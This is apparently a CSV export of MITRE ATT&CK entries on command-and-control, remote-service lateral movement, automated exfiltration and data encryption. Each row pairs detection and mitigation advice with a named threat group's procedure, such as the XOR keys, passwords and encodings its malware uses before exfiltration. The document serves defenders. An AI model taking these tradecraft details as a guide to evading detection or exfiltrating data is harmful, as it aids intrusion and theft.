501,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]] Correlating alerts between multiple communication channels can further help identify command-and-control behavior.']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use multiple network protocols to avoid network-based detection.[[CiteRef::Dell TG-3390]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1026'],['Multiband Communication'],https://attack.mitre.org/wiki/Technique/T1026
502,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]] Correlating alerts between multiple communication channels can further help identify command-and-control behavior.']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use multiple network protocols to avoid network-based detection.[[CiteRef::Dell TG-3390]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1026'],['Multiband Communication'],https://attack.mitre.org/wiki/Technique/T1026
503,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]] Correlating alerts between multiple communication channels can further help identify command-and-control behavior.']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use multiple network protocols to avoid network-based detection.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1026'],['Multiband Communication'],https://attack.mitre.org/wiki/Technique/T1026
504,['Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through [[Discovery]] techniques prior to attempting [[Lateral Movement]].'],[],['555'],[],['Authentication logs'],['[[Group/G0036|GCMAN]] uses Putty and VNC for lateral movement.[[CiteRef::Securelist GCMAN]]'],['GCMAN'],['GCMAN'],['G0036'],"['Limit the number of accounts that may use remote services. Use multifactor authentication where possible. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs. Prevent [[Credential Access]] techniques that may allow an adversary to acquire [[Technique/T1078|Valid Accounts]] that can be used by existing services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Active remote service accepting connections and valid credentials'],[],['Lateral Movement'],['Technique/T1021'],['Remote Services'],https://attack.mitre.org/wiki/Technique/T1021
505,['Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through [[Discovery]] techniques prior to attempting [[Lateral Movement]].'],[],['555'],[],['Authentication logs'],['[[Group/G0045|menuPass]] has used Putty Secure Copy Client (PSCP) to transfer data.[[CiteRef::PWC Cloud Hopper April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Limit the number of accounts that may use remote services. Use multifactor authentication where possible. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs. Prevent [[Credential Access]] techniques that may allow an adversary to acquire [[Technique/T1078|Valid Accounts]] that can be used by existing services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Active remote service accepting connections and valid credentials'],[],['Lateral Movement'],['Technique/T1021'],['Remote Services'],https://attack.mitre.org/wiki/Technique/T1021
506,['Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.'],[],[],[],"['File monitoring', 'Process monitoring', 'Process use of network']","['When a document is found matching one of the extensions in the configuration, [[Software/S0131|TINYTYPHON]] uploads it to the C2 server.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify unnecessary system utilities, scripts, or potentially malicious software that may be used to transfer data outside of a network, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: TINYTYPHON,['Exfiltration'],['Technique/T1020'],['Automated Exfiltration'],https://attack.mitre.org/wiki/Technique/T1020
507,['Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.'],[],[],[],"['File monitoring', 'Process monitoring', 'Process use of network']",['[[Software/S0136|USBStealer]] automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.[[CiteRef::ESET Sednit USBStealer 2014]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, scripts, or potentially malicious software that may be used to transfer data outside of a network, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Exfiltration'],['Technique/T1020'],['Automated Exfiltration'],https://attack.mitre.org/wiki/Technique/T1020
508,['Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.'],[],[],[],"['File monitoring', 'Process monitoring', 'Process use of network']",['[[Software/S0050|CosmicDuke]] exfiltrates collected files automatically over FTP to remote servers.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities, scripts, or potentially malicious software that may be used to transfer data outside of a network, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CosmicDuke, TinyBaron, ...",['Exfiltration'],['Technique/T1020'],['Automated Exfiltration'],https://attack.mitre.org/wiki/Technique/T1020
509,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] is known to use RAR with passwords to encrypt data prior to exfiltration.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
510,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
511,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['The Komplex C2 channel uses an 11-byte XOR algorithm to hide data [[CiteRef::Sofacy Komplex Trojan]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Komplex,['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
512,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","[""Data [[Software/S0035|SPACESHIP]] copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SPACESHIP,['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
513,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","[""[[Software/S0036|FLASHFLOOD]] employs the same encoding scheme as [[Software/S0035|SPACESHIP]] for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: FLASHFLOOD,['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
514,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0093|Backdoor.Oldrea]] writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Backdoor.Oldrea, Havex",['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
515,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['TRINITY malware used by [[Group/G0037|FIN6]] encodes data gathered from the victim with a simple substitution cipher and single-byte XOR using the OxAA key.[[CiteRef::FireEye FIN6 April 2016]]'],['FIN6'],['FIN6'],['G0037'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
516,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0032|Lazarus Group]] malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.[[CiteRef::Novetta Blockbuster Loaders]] [[Group/G0032|Lazarus Group]] malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server.[[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
517,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0072|OwaAuth]] DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: OwaAuth,['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
518,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0027|Threat Group-3390]] actors have encrypted data for exfiltration using the password ""admin-windows2014"" (with the year corresponding to the year of the intrusion).[[CiteRef::Dell TG-3390]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
519,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0027|Threat Group-3390]] has used RAR to compress, encrypt, and password-protect files prior to exfiltration.[[CiteRef::SecureWorks BRONZE UNION June 2017]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1022'],['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
